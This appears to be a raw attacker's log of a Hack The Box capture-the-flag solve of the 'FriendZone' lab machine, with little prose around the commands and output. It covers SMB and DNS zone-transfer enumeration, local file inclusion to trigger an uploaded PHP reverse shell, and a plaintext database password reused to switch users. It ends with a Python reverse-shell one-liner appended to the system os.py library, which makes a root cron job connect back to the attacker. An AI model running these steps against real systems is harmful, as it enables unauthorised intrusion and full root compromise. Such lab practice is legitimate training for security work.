@@ -1,0 +1,640 @@
+
+oot@kali:~/HTB/Friendzone# smbclient -L //friendzone.htb
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	Files           Disk      FriendZone Samba Server Files /etc/Files
+	general         Disk      FriendZone Samba Server Files
+	Development     Disk      FriendZone Samba Server Files
+	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            FRIENDZONE
+
+
+GOT creds.txt from general SMB Share
+
+
+Email us at: info@friendzoneportal.red
+
+
+oot@kali:~/HTB/Friendzone# rpcclient -U "" friendzone.htb
+Enter WORKGROUP\'s password: 
+rpcclient $> lsaenumsids
+command not found: lsaenumsids
+rpcclient $> lsaenumsid
+found 6 SIDs
+
+S-1-5-32-550
+S-1-5-32-548
+S-1-5-32-551
+S-1-5-32-549
+S-1-5-32-544
+S-1-1-0
+rpcclient $> lookupsids S-1-5-32-550
+S-1-5-32-550 BUILTIN\Print Operators (4)
+rpcclient $> S-1-5-32-548
+command not found: S-1-5-32-548
+rpcclient $> lookupsids S-1-5-32-548
+S-1-5-32-548 BUILTIN\Account Operators (4)
+rpcclient $> lookupsids S-1-5-32-551
+S-1-5-32-551 BUILTIN\Backup Operators (4)
+rpcclient $> lookupsids S-1-5-32-549
+S-1-5-32-549 BUILTIN\Server Operators (4)
+rpcclient $> lookupsids S-1-5-32-544
+S-1-5-32-544 BUILTIN\Administrators (4)
+rpcclient $> lookupsids S-1-1-0
+S-1-1-0 \Everyone (5)
+rpcclient $> 
+
+
+oot@kali:~/HTB/Friendzone# dig friendzone.htb
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> friendzone.htb
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 3127
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1280
+;; QUESTION SECTION:
+;friendzone.htb.			IN	A
+
+;; AUTHORITY SECTION:
+.			10800	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2019060701 1800 900 604800 86400
+
+;; Query time: 2625 msec
+;; SERVER: 192.168.43.1#53(192.168.43.1)
+;; WHEN: Fri Jun 07 19:05:20 WAT 2019
+;; MSG SIZE  rcvd: 118
+
+
+
+ZONE TRANSFER SUCCESSFUL 
+
+root@kali:~/HTB/Friendzone# dig axfr friendzoneportal.red @10.10.10.123
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzoneportal.red @10.10.10.123
+;; global options: +cmd
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzoneportal.red.	604800	IN	AAAA	::1
+friendzoneportal.red.	604800	IN	NS	localhost.
+friendzoneportal.red.	604800	IN	A	127.0.0.1
+admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
+files.friendzoneportal.red. 604800 IN	A	127.0.0.1
+imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
+vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 1230 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Fri Jun 07 19:36:02 WAT 2019
+;; XFR size: 9 records (messages 1, bytes 309)
+
+root@kali:~/HTB/Friendzone# 
+
+
+
+root@kali:~/HTB/Friendzone# dig admin.friendzoneportal.red @friendzone.htb
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> admin.friendzoneportal.red @friendzone.htb
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2186
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: df7beabfe5e8f491d3fa1b245cfab09bb6f7377388393cf2 (good)
+;; QUESTION SECTION:
+;admin.friendzoneportal.red.	IN	A
+
+;; ANSWER SECTION:
+admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
+
+;; AUTHORITY SECTION:
+friendzoneportal.red.	604800	IN	NS	localhost.
+
+;; ADDITIONAL SECTION:
+localhost.		604800	IN	A	127.0.0.1
+localhost.		604800	IN	AAAA	::1
+
+;; Query time: 441 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Fri Jun 07 19:44:44 WAT 2019
+;; MSG SIZE  rcvd: 166
+
+
+root@kali:~/HTB/Friendzone# dnsrecon -d friendzone.htb -t axfr
+[*] Testing NS Servers for Zone Transfer
+[*] Checking for Zone Transfer for friendzone.htb name servers
+[*] Resolving SOA Record
+[+] 	 SOA a.root-servers.net 198.41.0.4
+[*] Resolving NS Records
+[-] Could not Resolve NS Records
+[*] Removing any duplicate NS server IP Addresses...
+[*]  
+[*] Trying NS server 198.41.0.4
+[+] 198.41.0.4 Has port 53 TCP Open
+[-] Zone Transfer Failed!
+[-] Zone transfer error: REFUSED
+
+
+root@kali:~/HTB/Friendzone# dig a.root-servers.net @friendzone.htb
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> a.root-servers.net @friendzone.htb
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 50103
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 5dd9a84e6567cde94f5c06635cfb79aab448e6d4e1b2a235 (good)
+;; QUESTION SECTION:
+;a.root-servers.net.		IN	A
+
+;; Query time: 1119 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Sat Jun 08 10:02:35 WAT 2019
+;; MSG SIZE  rcvd: 75
+
+root@kali:~/HTB/Friendzone# dig nstld.verisign-grs.com @friendzone.htb
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> nstld.verisign-grs.com @friendzone.htb
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 28584
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: f05f1f77c337d4ea007873875cfb79d67c1b1c5f3438e2ae (good)
+;; QUESTION SECTION:
+;nstld.verisign-grs.com.		IN	A
+
+;; Query time: 1724 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Sat Jun 08 10:03:18 WAT 2019
+;; MSG SIZE  rcvd: 79
+
+root@kali:~/HTB/Friendzone# 
+
+root@kali:~/HTB/Friendzone# host -l friendzone.htb a.root-servers.net
+Using domain server:
+Name: a.root-servers.net
+Address: 198.41.0.4#53
+Aliases: 
+
+Host friendzone.htb not found: 5(REFUSED)
+; Transfer failed.
+
+
+
+I PUT friendzone.red in /etc/hosts since the port 443 issuer is friendzone.red
+and dig to get this
+
+root@kali:~/HTB/Friendzone# dig axfr friendzone.red @10.10.10.123
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 1699 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Sat Jun 08 11:23:25 WAT 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+
+added 127.0.0.1 to /etc/resolv.conf and got some unused domains after vising the subdomains
+
+
+added 10.10.10.123(ip of friendzone) to /etc/hosts as adminstrator1.friendzone.red
+
+oot@kali:~/HTB/Writeup# cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+10.10.10.123	administrator1.friendzone.red
+10.10.10.123	friendzone.red
+10.10.10.133	onetwoseven.htb
+10.10.10.138	writeup.htb
+10.10.10.140	swagshop.htb
+10.10.10.130	arkham.htb
+10.10.10.139	ellingson.htb
+10.10.10.101	ghoul.htb
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+root@kali:~/HTB/Writeup# 
+
+goto https://administrator1.friendzone.red
+
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
+
+
+
+
+Upload reverse shell to Development share
+
+oot@kali:~/HTB/Friendzone# smbclient //10.10.10.123/Development
+Enter WORKGROUP\root's password: anonymous
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jun  8 21:30:58 2019
+  ..                                  D        0  Wed Jan 23 22:51:02 2019
+  LinEnum.sh                          A    45578  Sat Jun  8 21:28:27 2019
+  rev.php                             A     2181  Sat Jun  8 20:52:49 2019
+  reverse.php                         A     5494  Sat Jun  8 20:53:24 2019
+  loaff.php                           A     1746  Sat Jun  8 20:47:49 2019
+  phpshell.php                        A     3464  Sat Jun  8 21:30:58 2019
+  shell.php                           A       76  Sat Jun  8 21:14:35 2019
+
+		9221460 blocks of size 1024. 6391048 blocks available
+
+
+Enum shares for file path
+root@kali:~# nmap -Pn --script=/usr/share/nmap/scripts/smb-enum-shares.nse -p 445 10.10.10.123 -A
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-09 10:32 WAT
+Nmap scan report for administrator1.friendzone.red (10.10.10.123)
+Host is up (0.18s latency).
+
+PORT    STATE SERVICE     VERSION
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: FRIENDZONE
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.10.123\Development: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\etc\Development
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\Files: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files /etc/Files
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\etc\hole
+|     Anonymous access: <none>
+|     Current user access: <none>
+|   \\10.10.10.123\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
+|     Users: 2
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\general: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\etc\general
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT       ADDRESS
+1   298.26 ms 10.10.12.1
+
+
+
+Load paths into LFISuite, select scanner and run, get a connect back
+
+
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/hello
+
+root@kali:~/HTB/Friendzone# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.13.105] from administrator1.friendzone.red [10.10.10.123] 36380
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 13:46:50 up  5:24,  0 users,  load average: 0.12, 0.19, 0.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+swapfile
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ cd home
+$ ls -a
+.
+..
+friend
+$ cd friend
+$ ls -a
+.
+..
+.bash_history
+.bash_logout
+.bashrc
+.cache
+.gnupg
+.local
+.profile
+.sudo_as_admin_successful
+user.txt
+$ cat user.txt 
+a9ed20acecd6c5b6b52f474e15ae9a11
+$ 
+
+
+$ uname -a
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+$ env
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=9:23515
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=41b9041e7b9c46b0bb3678e4b2bc1c49
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/
+
+$ python3 -c "import pty; pty.spawn('/bin/sh');"
+$ cat /etc/sudoers
+cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/su
+/bin/ntfs-3g
+/bin/ping
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/sbin/exim4
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+$ find / -perm -2000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+/sbin/pam_extrausers_chkpwd
+/sbin/unix_chkpwd
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/bin/expiry
+/usr/bin/mlocate
+/usr/bin/dotlock.mailutils
+/usr/bin/crontab
+/usr/bin/bsd-write
+/usr/bin/chage
+$ cat /etc/shadow
+cat /etc/shadow
+cat: /etc/shadow: Permission denied
+$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin
+ftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+bind:x:109:116::/var/cache/bind:/usr/sbin/nologin
+$ ls -la ~/.ssh/
+ls -la ~/.ssh/
+ls: cannot access '~/.ssh/': No such file or directory
+$ find / -perm -2 -type f 2>/dev/null
+find / -perm -2 -type f 2>/dev/null
+/etc/Development/hello.php
+/etc/Development/PHPINFO.php
+/etc/Development/ktphp.php
+/etc/Development/ziemnix.php
+/etc/Development/ziemni.php
+/etc/Development/z.php
+/etc/Development/shell.php
+
+$ cat /etc/group
+cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,friend
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:friend
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:friend
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:friend
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+mlocate:x:108:
+uuidd:x:109:
+ssh:x:110:
+friend:x:1000:
+lpadmin:x:111:friend
+sambashare:x:112:friend
+ssl-cert:x:113:
+Debian-exim:x:114:
+ftp:x:115:
+bind:x:116:
+rdma:x:117:
+netdev:x:118:
+
+
+
+found a suspicious running root program with pspy
+
+019/06/09 18:30:01 CMD: UID=0    PID=1383   | /bin/sh -c /opt/server_admin/reporter.py 
+2019/06/09 18:30:01 CMD: UID=0    PID=1382   | /bin/sh -c /opt/server_admin/reporter.py 
+
+$ ls -l /opt/server_admin/reporter.py
+ls -l /opt/server_admin/reporter.py
+-rwxr--r-- 1 root root 424 Jan 16 22:03 /opt/server_admin/reporter.py
+
+
+
+
+$ python reporter.py
+python reporter.py
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site.py", line 68, in <module>
+    import os
+  File "/usr/lib/python2.7/os.py", line 751
+SyntaxError: Non-ASCII character '\xe2' in file /usr/lib/python2.7/os.py on line 751, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details
+
+
+
+$ cd /var
+cd /var
+$ ls
+ls
+backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp  www
+$ cd www
+cd www
+$ ls
+ls
+admin	    friendzoneportal	   html		    uploads
+friendzone  friendzoneportaladmin  mysql_data.conf
+$ cat mysql_data.conf
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+$ su friend
+su friend
+Password: Agpyu12!0.213$
+
+friend@FriendZone:/$ cat /root/root.txt
+cat /root/root.txt
+cat: /root/root.txt: Permission denied
+friend@FriendZone:/$ echo "import os; os.system('cat /root/root.txt');" >> /opt/server_admin/reporter.py
+</root/root.txt');" >> /opt/server_admin/reporter.py
+bash: /opt/server_admin/reporter.py: Permission denied
+
+
+
+
+friend@FriendZone:~$ echo 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.17",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' >> /usr/lib/python2.7/os.py
+friend@FriendZone:~$ sudo ./opt/server_admin/reporter.py
+[sudo] password for friend: 
+friend is not in the sudoers file.  This incident will be reported.
+
+
+
+root@kali:~# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.17] from administrator1.friendzone.red [10.10.10.123] 45788
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+b0e6c60b82cf96e9855ac1656a9e90c7
+# exit
+exit
+[+] Trying to send email to admin1@friendzone.com
+root@kali:~#
+
